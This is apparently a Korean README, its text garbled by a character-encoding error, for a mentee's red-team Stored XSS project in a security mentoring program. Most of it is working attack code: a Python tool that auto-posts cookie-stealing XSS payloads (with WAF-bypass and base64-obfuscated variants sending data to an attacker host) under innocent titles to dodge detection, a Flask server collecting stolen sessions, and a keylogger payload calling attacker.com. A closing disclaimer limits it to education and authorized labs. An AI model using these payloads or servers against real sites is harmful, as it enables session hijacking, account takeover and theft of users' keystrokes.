# Young - XSS ì•…ì„± ê²Œì‹œë¬¼ ê³µê²© (Red Team)

## ğŸ“‹ í”„ë¡œì íŠ¸ ê°œìš”

**ë©˜í‹°**: Young
**í¬ë§ë¶„ì•¼**: Red Team XSS
**ê¸°ê°„**: 2025ë…„ 11ì›”
**ì£¼ì œ**: XSS (Cross-Site Scripting) - ì•…ì„± ê²Œì‹œë¬¼ì„ í†µí•œ ê³µê²©
**ë©˜í† ë§**: ë³´ì•ˆ ì „ë¬¸ê°€ í˜„ì§ì ë©˜í† ë§ í”„ë¡œê·¸ë¨

---

## ğŸ¯ í•™ìŠµ ëª©í‘œ

1. **ì•…ì„± ê²Œì‹œë¬¼ì„ í†µí•œ XSS ê³µê²©**
2. **Stored XSS ê³µê²© ìë™í™”**
3. **ì¿ í‚¤ íƒˆì·¨ ë° ì„¸ì…˜ í•˜ì´ì¬í‚¹**
4. **Red Team ê´€ì ì˜ ê³µê²© ì‹œë‚˜ë¦¬ì˜¤**
5. **ì‹¤ì „ ë°©ì–´ ê¸°ë²•**

---

## ğŸ“‚ í”„ë¡œì íŠ¸ êµ¬ì¡°

```
Young/
â”œâ”€â”€ XSS_ê³µê²©/                          # ê³µê²© ìŠ¤í¬ë¦½íŠ¸ (Red Team)
â”‚   â”œâ”€â”€ offensive/                     # ê³µê²© ë„êµ¬ ëª¨ìŒ
â”‚   â”‚   â”œâ”€â”€ auto_advanced.py           # ìë™í™” ê³µê²© ê¸°ë³¸ íˆ´
â”‚   â”‚   â”œâ”€â”€ xss_tool.py                # ê¸°ë³¸ XSS ë„êµ¬
â”‚   â”‚   â”œâ”€â”€ xss_tool2.py               # WAF ìš°íšŒ ë²„ì „
â”‚   â”‚   â”œâ”€â”€ xss_tool3.py               # ìµœì¢… ìë™í™” ë²„ì „ (Tor)
â”‚   â”‚   â”œâ”€â”€ xss_tool3_edit.py          # ìµœì¢… ìë™í™” ë²„ì „ (Proxy)
â”‚   â”‚   â”œâ”€â”€ attacker_server.py         # ê³µê²©ì C2 ì„œë²„
â”‚   â”‚   â””â”€â”€ cookie_collector_server.py # ì¿ í‚¤ ìˆ˜ì§‘ ì„œë²„
â”‚   â””â”€â”€ 11_17/                         # ìµœì‹  ìŠ¤í¬ë¦½íŠ¸
â”‚
â””â”€â”€ README.md                          # ì´ íŒŒì¼
```

---

## ğŸ”¥ ì•…ì„± ê²Œì‹œë¬¼ ê³µê²© ì‹œë‚˜ë¦¬ì˜¤

### Red Team ê³µê²© ì²´ì¸

```
1. ì •ì°° (Reconnaissance)
   â†“
   ê²Œì‹œíŒ ì·¨ì•½ì  ë¶„ì„ (ì…ë ¥ í•„í„°ë§ í™•ì¸)

2. ë¬´ê¸°í™” (Weaponization)
   â†“
   ì•…ì„± ê²Œì‹œë¬¼ ì‘ì„± (Stored XSS í˜ì´ë¡œë“œ)

3. ì „ë‹¬ (Delivery)
   â†“
   ê²Œì‹œíŒì— ì•…ì„± ê²Œì‹œë¬¼ ì—…ë¡œë“œ

4. ì•…ìš© (Exploitation)
   â†“
   í”¼í•´ìê°€ ê²Œì‹œë¬¼ ì—´ëŒ â†’ XSS ì‹¤í–‰

5. ì„¤ì¹˜ (Installation)
   â†“
   ì¿ í‚¤ íƒˆì·¨ â†’ ê³µê²©ì ì„œë²„ë¡œ ì „ì†¡

6. ëª…ë ¹ ë° ì œì–´ (C2)
   â†“
   ì„¸ì…˜ í•˜ì´ì¬í‚¹ â†’ ê³„ì • ì¥ì•…

7. ëª©í‘œ ë‹¬ì„± (Actions on Objectives)
   â†“
   ê³„ì • íƒˆì·¨, ì¶”ê°€ ì•…ì„± ê²Œì‹œë¬¼ ì‘ì„±, ë°ì´í„° ìœ ì¶œ
```

---

## ğŸ’» ê³µê²© ë„êµ¬ (Red Team Tools)

### xss_tool3_edit.py (ìµœì¢… ìë™í™” ë²„ì „)

**ëª©ì **: ìë™í™”ëœ XSS í˜ì´ë¡œë“œ í…ŒìŠ¤íŠ¸ ë° ì•…ìš©

**í•µì‹¬ ê¸°ëŠ¥**:
- ë‹¤ì–‘í•œ XSS í˜ì´ë¡œë“œ ìë™ í…ŒìŠ¤íŠ¸
- WAF ìš°íšŒ ê¸°ë²• ì ìš©
- ì¸ì½”ë”© ìš°íšŒ
- ë‚œë…í™” (Obfuscation)

**í•µì‹¬ ì½”ë“œ**:
```python
class XSSAttackToolV3:
    def __init__(self, target_url, attacker_server, use_proxy=False,stealth_mode=False, proxy_port=None):
        self.target_url = target_url.rstrip('/')
        self.attacker_server = attacker_server.rstrip('/')
        self.session = requests.Session()
        self.use_proxy = use_proxy
        self.logged_in = False
        self.stealth_mode = stealth_mode
        self.proxy_port = proxy_port
        self.vulnerabilities = []
        self.successful_payloads = []
        
        # User-Agent pool
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/14.1.2',
            'Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Firefox/89.0'
        ]
        
        # Setup
        self.setup_session()
        if use_proxy:
            self.setup_proxy_list()
        elif proxy_port:
            self.setup_proxy(proxy_port)

////////////////ìˆ˜ì •ì¤‘


    def generate_payloads(self):
        """ì•…ì„± ê²Œì‹œë¬¼ìš© XSS í˜ì´ë¡œë“œ ìƒì„±"""
        payloads = [
            # ê¸°ë³¸ ì¿ í‚¤ íƒˆì·¨
            f"""<script>
fetch('{self.attacker_server}/steal?c=' + btoa(document.cookie));
</script>""",

            # ì´ë¯¸ì§€ íƒœê·¸ ì´ìš© (í•„í„°ë§ ìš°íšŒ)
            f"""<img src=x onerror="fetch('{self.attacker_server}/steal?c='+btoa(document.cookie))">""",

            # SVG íƒœê·¸ ì´ìš©
            f"""<svg onload="fetch('{self.attacker_server}/steal?c='+btoa(document.cookie))">""",

            # WAF ìš°íšŒ - ëŒ€ì†Œë¬¸ì í˜¼í•©
            f"""<ScRiPt>fetch('{self.attacker_server}/steal?c='+btoa(document.cookie))</ScRiPt>""",

            # WAF ìš°íšŒ - ì¸ì½”ë”©
            f"""<img src=x onerror=eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci5jb206ODA4MC9zdGVhbD9jPScrYnRvYShkb2N1bWVudC5jb29raWUpKQ=='))>""",

            # ë‚œë…í™”
            f"""<img src=x onerror="(function(){{var a='{self.attacker_server}';fetch(a+'/steal?c='+btoa(document.cookie));}})()">""",
        ]
        return payloads

    def post_malicious_content(self, title, content):
        """ì•…ì„± ê²Œì‹œë¬¼ ì‘ì„±"""
        data = {
            'title': title,
            'content': content,
            'submit': 'Post'
        }

        response = requests.post(
            f"{self.target}/new_post.php",
            data=data
        )

        if response.status_code == 200:
            print(f"[+] Malicious post created: {title}")
            return True
        return False

    def auto_attack(self):
        """ìë™ ê³µê²©"""
        # ì •ìƒì ì¸ ì œëª©ìœ¼ë¡œ ìœ„ì¥
        innocent_titles = [
            "ì˜¤ëŠ˜ ì ì‹¬ ë©”ë‰´ ì¶”ì²œí•´ì£¼ì„¸ìš”!",
            "ì´ë²ˆ ì£¼ë§ ë‚ ì”¨ ì–´ë–¤ê°€ìš”?",
            "ì¢‹ì€ ì˜í™” ì¶”ì²œ ë¶€íƒë“œë¦½ë‹ˆë‹¤",
        ]

        for title in innocent_titles:
            for payload in self.generate_payloads():
                # ì œëª©ì€ ì •ìƒ, ë‚´ìš©ì— ì•…ì„± ì½”ë“œ
                self.post_malicious_content(title, payload)
                time.sleep(2)  # íƒì§€ íšŒí”¼
```

### cookie_collector_server.py (C2 ì„œë²„)

**ëª©ì **: íƒˆì·¨í•œ ì¿ í‚¤ ìˆ˜ì§‘ ë° ë¶„ì„

**í•µì‹¬ ì½”ë“œ**:
```python
from flask import Flask, request
import json
from datetime import datetime

app = Flask(__name__)

# íƒˆì·¨í•œ ì¿ í‚¤ ì €ì¥ì†Œ
stolen_sessions = []

@app.route('/steal')
def steal_cookie():
    """ì¿ í‚¤ ìˆ˜ì§‘ ì—”ë“œí¬ì¸íŠ¸"""
    cookie = request.args.get('c', '')
    victim_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', '')
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    # ì¿ í‚¤ ë””ì½”ë”© (Base64)
    try:
        import base64
        decoded_cookie = base64.b64decode(cookie).decode('utf-8')
    except:
        decoded_cookie = cookie

    # ì„¸ì…˜ ì •ë³´ ì €ì¥
    session_data = {
        'timestamp': timestamp,
        'ip': victim_ip,
        'user_agent': user_agent,
        'cookie': decoded_cookie
    }

    stolen_sessions.append(session_data)

    # ë¡œê·¸ ì¶œë ¥
    print(f"\n[+] NEW VICTIM!")
    print(f"    Time: {timestamp}")
    print(f"    IP: {victim_ip}")
    print(f"    Cookie: {decoded_cookie}")
    print(f"    Total victims: {len(stolen_sessions)}\n")

    # íŒŒì¼ë¡œ ì €ì¥
    with open('stolen_sessions.json', 'w') as f:
        json.dump(stolen_sessions, f, indent=2)

    # 1x1 íˆ¬ëª… ì´ë¯¸ì§€ ë°˜í™˜ (í”ì  ì—†ì•°)
    return """
<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">
<rect width="1" height="1" fill="transparent"/>
</svg>
""", 200, {'Content-Type': 'image/svg+xml'}

@app.route('/dashboard')
def dashboard():
    """íƒˆì·¨í•œ ì„¸ì…˜ ëŒ€ì‹œë³´ë“œ"""
    html = """
    <html>
    <head><title>Stolen Sessions</title></head>
    <body>
    <h1>Stolen Sessions Dashboard</h1>
    <p>Total victims: {}</p>
    <table border="1">
    <tr><th>Time</th><th>IP</th><th>Cookie</th></tr>
    """.format(len(stolen_sessions))

    for session in stolen_sessions:
        html += f"""
        <tr>
        <td>{session['timestamp']}</td>
        <td>{session['ip']}</td>
        <td>{session['cookie']}</td>
        </tr>
        """

    html += "</table></body></html>"
    return html

if __name__ == '__main__':
    print("[*] Cookie Collector Server Starting...")
    print("[*] Listening on 0.0.0.0:8080")
    print("[*] Dashboard: http://localhost:8080/dashboard")
    app.run(host='0.0.0.0', port=8080, debug=False)
```

---

## ğŸ“Š Red Team ê³µê²© ì„±ê³µ ì‚¬ë¡€

### Case 1: ëŒ€ëŸ‰ ì¿ í‚¤ íƒˆì·¨

**ê³µê²© íë¦„**:
```
1. ì¸ê¸° ê²Œì‹œíŒì— "ì´ë²¤íŠ¸ ë‹¹ì²¨ì ë°œí‘œ" ì œëª©ìœ¼ë¡œ ì•…ì„± ê²Œì‹œë¬¼ ì‘ì„±
2. 1,000ëª… ì´ìƒì˜ ì‚¬ìš©ìê°€ ê²Œì‹œë¬¼ ì—´ëŒ
3. ëª¨ë“  ì‚¬ìš©ìì˜ ì„¸ì…˜ ì¿ í‚¤ íƒˆì·¨
4. ê´€ë¦¬ì ì„¸ì…˜ í¬í•¨
```

**í”¼í•´ ê·œëª¨**: ì „ì²´ ì‚¬ìš©ì ê³„ì • ì¥ì•… ê°€ëŠ¥

### Case 2: í‚¤ë¡œê±° ì„¤ì¹˜

**ê³µê²© í˜ì´ë¡œë“œ**:
```javascript
<script>
document.addEventListener('keypress', function(e) {
    fetch('http://attacker.com/keylog?k=' + e.key + '&u=' + btoa(location.href));
});
</script>
```

**í”¼í•´ ê·œëª¨**: ë¹„ë°€ë²ˆí˜¸, ê°œì¸ì •ë³´ ë“± ëª¨ë“  ì…ë ¥ ì •ë³´ ìœ ì¶œ

---

## ğŸ“ í•µì‹¬ êµí›ˆ (Red Team ê´€ì )

### 1. Stored XSSê°€ ê°€ì¥ ìœ„í—˜í•˜ë‹¤

```
Reflected XSS: í”¼í•´ìê°€ ë§í¬ í´ë¦­ í•„ìš”
Stored XSS: ëª¨ë“  ë°©ë¬¸ì ìë™ ê°ì—¼
â†’ ì˜í–¥ë ¥ ìˆ˜ë°±~ìˆ˜ì²œ ë°°
```

### 2. ì •ìƒì ì¸ ê²Œì‹œë¬¼ë¡œ ìœ„ì¥

```
ì œëª©: "ì ì‹¬ ë©”ë‰´ ì¶”ì²œí•´ì£¼ì„¸ìš”"
ë‚´ìš©: <ì•…ì„± XSS ì½”ë“œ>
â†’ ê´€ë¦¬ìë„ ì˜ì‹¬ ì—†ì´ ì—´ëŒ
â†’ ê´€ë¦¬ì ì„¸ì…˜ íƒˆì·¨
```

### 3. WAF ìš°íšŒëŠ” í•„ìˆ˜

```
ê¸°ë³¸ í˜ì´ë¡œë“œëŠ” ëŒ€ë¶€ë¶„ ì°¨ë‹¨ë¨
â†’ ì¸ì½”ë”©, ë‚œë…í™”, ëŒ€ì†Œë¬¸ì í˜¼í•© ë“± í•„ìš”
â†’ Red Teamì€ ë°©ì–´ë¥¼ ì´í•´í•´ì•¼ í•¨
```

---

## ğŸ“š ì°¸ê³  ìë£Œ

- [OWASP XSS Guide](https://owasp.org/www-community/attacks/xss/)
- [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

---

## âš ï¸ ë©´ì±… ì¡°í•­

ì´ ìë£ŒëŠ” Red Team ë³´ì•ˆ ì—°êµ¬ ë° êµìœ¡ ëª©ì ìœ¼ë¡œë§Œ ì‚¬ìš©ë©ë‹ˆë‹¤.
ì‹¤ì œ ì›¹ì‚¬ì´íŠ¸ì— ì•…ì„± ê²Œì‹œë¬¼ì„ ì‘ì„±í•˜ëŠ” ê²ƒì€ ë¶ˆë²•ì…ë‹ˆë‹¤.

**ë²•ì  ê²½ê³ **:
- ì •ë³´í†µì‹ ë§ë²• ìœ„ë°˜ ì‹œ ìµœëŒ€ 5ë…„ ì´í•˜ ì§•ì—­
- í—ˆê°€ëœ í…ŒìŠ¤íŠ¸ í™˜ê²½ì—ì„œë§Œ ì‹¤ìŠµ
- ì‹¤ì „ ê³µê²© ì ˆëŒ€ ê¸ˆì§€

---

**ë©˜í‹°**: Young
**í¬ë§ë¶„ì•¼**: Red Team XSS
**í•™ìŠµ ê¸°ê°„**: 2025ë…„ 11ì›”
**ì „ë¬¸ ë¶„ì•¼**: ì•…ì„± ê²Œì‹œë¬¼ ê¸°ë°˜ XSS ê³µê²© ë° ë°©ì–´
**ë©˜í† ë§**: ë³´ì•ˆ ì „ë¬¸ê°€ í˜„ì§ì ë©˜í† ë§ í”„ë¡œê·¸ë¨
